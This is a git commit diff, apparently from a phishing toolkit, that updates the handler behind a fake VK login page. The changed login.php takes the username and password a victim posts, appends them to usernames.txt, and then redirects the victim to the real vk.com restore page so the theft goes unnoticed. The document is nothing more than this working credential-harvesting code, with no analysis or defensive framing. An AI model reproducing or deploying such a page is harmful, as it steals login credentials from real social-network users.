fec77695817b1053ad2d5026c90708acd67a8afe
htr-tech <tahmidrayat@gmail.com>
2022-12-30 16:18:44 +0600

    New VK Login Interface

--- .sites/vk/login.php
+++ .sites/vk/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Vk Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Vk Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://vk.com/restore/');
 exit();
